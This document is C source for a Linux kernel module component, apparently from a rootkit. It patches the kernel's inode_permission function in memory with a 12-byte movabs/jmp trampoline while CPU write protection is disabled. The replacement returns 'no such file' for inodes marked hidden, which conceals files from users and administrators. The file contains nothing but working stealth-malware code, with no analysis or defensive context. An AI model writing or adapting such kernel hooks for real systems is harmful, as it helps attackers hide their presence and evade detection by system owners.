#include <linux/kernel.h>
#include <linux/spinlock.h>
#include <linux/fs.h>

#include "procfs_ops.h"
#include "memory_prot.h"
#include "err.h"

#define JMP_CODE_SZ 12
#define JMP_PATCH_OFFSET 2

struct hook
{
	void *orig_fn;
	void *hook_fn;
	char orig_code[JMP_CODE_SZ];
	char hijack_code[JMP_CODE_SZ];
};

extern int inode_permission(struct inode *inode, int mask);
static struct hook inode_perm_hook;

/*
 * movabs $address, %rax
 * jmpq *rax
 */
static char jmp_code[JMP_CODE_SZ] = "\x48\xb8\x00\x00\x00\x00"
				    "\x00\x00\x00\x00\xff\xe0";

// used to avoid race conditions during memcpy of jmp shellcode
static DEFINE_SPINLOCK(hijack_spinlock);

#define HIJACK_SPIN_LOCK \
	spin_lock_irqsave(&hijack_spinlock, spin_flags)

#define HIJACK_SPIN_UNLOCK \
	spin_unlock_irqrestore(&hijack_spinlock, spin_flags)

static void init_hook(struct hook *h, void *orig_fn, void *hook_fn)
{
	log_err("orig_fn = 0x%p\n", orig_fn);
	h->orig_fn = orig_fn;
	h->hook_fn = hook_fn;
	memcpy((char*)h->orig_code, orig_fn, JMP_CODE_SZ);
	memcpy(h->hijack_code, jmp_code, JMP_CODE_SZ);
	*((unsigned long *)&h->hijack_code[JMP_PATCH_OFFSET]) = (unsigned long)
								hook_fn;
}

static void do_hook(struct hook *h)
{
	unsigned long spin_flags;
	HIJACK_SPIN_LOCK;
	disable_wp();
	memcpy((char*)h->orig_fn, h->hijack_code, JMP_CODE_SZ);
	enable_wp();
	HIJACK_SPIN_UNLOCK;
}

static void clear_hook(struct hook *h)
{
	unsigned long spin_flags;
	HIJACK_SPIN_LOCK;
	disable_wp();
	memcpy((char*)h->orig_fn, h->orig_code, JMP_CODE_SZ);
	enable_wp();
	HIJACK_SPIN_UNLOCK;
}

static int zl_inode_permission(struct inode *inode, int mask)
{
	int orig_ret;
	unsigned long spin_flags;
	struct hook *h = &inode_perm_hook;
	if (!inode)
		goto call_original;
	if (is_inode_hidden(inode))
		return -ENOENT;
call_original:
	HIJACK_SPIN_LOCK;
	disable_wp();
	memcpy((char*)h->orig_fn, h->orig_code, JMP_CODE_SZ);
	orig_ret = ((int (*)(struct inode *, int))h->orig_fn)(inode, mask);
	memcpy((char*)h->orig_fn, h->hijack_code, JMP_CODE_SZ);
	enable_wp();
	HIJACK_SPIN_UNLOCK;
	return orig_ret;
}

void hook_inode_permission(void)
{
	init_hook(&inode_perm_hook, inode_permission, zl_inode_permission);
	do_hook(&inode_perm_hook);
}

void unhook_inode_permission(void)
{
	clear_hook(&inode_perm_hook);
}
